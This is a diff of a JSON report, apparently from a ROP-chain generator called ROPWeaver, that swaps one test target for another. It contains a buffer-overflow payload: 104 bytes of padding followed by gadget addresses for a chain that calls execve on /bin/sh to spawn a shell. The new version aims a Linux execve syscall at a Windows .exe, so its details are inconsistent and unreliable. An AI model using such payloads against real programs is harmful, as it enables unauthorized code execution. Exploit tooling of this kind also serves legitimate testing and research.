-        "data": "\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x2a\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\x0d\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x2c\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2e\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x30\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\x3b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x32\\x11\\x40\\x00\\x00\\x00\\x00\\x00",
+        "data": "\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x54\\x14\\x00\\x40\\x01\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x56\\x14\\x00\\x40\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x14\\x00\\x40\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5a\\x14\\x00\\x40\\x01\\x00\\x00\\x00\\x3b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5c\\x14\\x00\\x40\\x01\\x00\\x00\\x00",
         "format": "python_hex_string",
         "padding_size": 104
     },
-    "report_date": "2026-10-10T20:09:43Z",
-    "report_id": "ROPW-binsh_test_65e22acd2b3f",
+    "report_date": "2026-10-30T16:45:52Z",
+    "report_id": "ROPW-classic_bof_c5140d3fe9ac",
     "rop_chain_details": [
         {
             "assembly": "pop rdi ; ret",
             "comment": "Set RDI to /bin/sh address",
-            "gadget_address": "0x000000000040112a",
+            "gadget_address": "0x0000000140001454",
             "index": 1,
             "register": "rdi",
             "type": "Register_Load",
-            "value_loaded": "0x000000000000200d"
+            "value_loaded": "0x0000000000002000"
         },
         {
             "assembly": "pop rsi ; ret",
             "comment": "Set RSI to 0",
-            "gadget_address": "0x000000000040112c",
+            "gadget_address": "0x0000000140001456",
             "index": 2,
             "register": "rsi",
             "type": "Register_Load",
@@ -176,7 +1034,7 @@
         {
             "assembly": "pop rdx ; ret",
             "comment": "Set RDX to 0",
-            "gadget_address": "0x000000000040112e",
+            "gadget_address": "0x0000000140001458",
             "index": 3,
             "register": "rdx",
             "type": "Register_Load",
@@ -185,7 +1043,7 @@
         {
             "assembly": "pop rax ; ret",
             "comment": "Set RAX to syscall number 59 (execve)",
-            "gadget_address": "0x0000000000401130",
+            "gadget_address": "0x000000014000145a",
             "index": 4,
             "register": "rax",
             "type": "Register_Load",
@@ -194,7 +1052,7 @@
         {
             "assembly": "syscall",
             "comment": "Invoke execve syscall",
-            "gadget_address": "0x0000000000401132",
+            "gadget_address": "0x000000014000145c",
             "index": 5,
             "register": "",
             "type": "Syscall_Execution",
@@ -207,9 +1065,9 @@
         "target_syscall": "execve"
     },
     "target_binary": {
-        "filename": "test_binaries\\binsh_test",
-        "hash": "65e22acd2b3fa65863ac11d09bad8657099e6979a1d912ed7b6231e489def2a8",
-        "sha256": "65e22acd2b3fa65863ac11d09bad8657099e6979a1d912ed7b6231e489def2a8"
+        "filename": "test_binaries\\classic_bof.exe",
+        "hash": "c5140d3fe9acfbce8b8cf1678e168e7402b8eb59f8d5148b848969cb8297d31f",
+        "sha256": "c5140d3fe9acfbce8b8cf1678e168e7402b8eb59f8d5148b848969cb8297d31f"
     },
     "tool_version": "ROPWeaver_v1.2.3"
 }
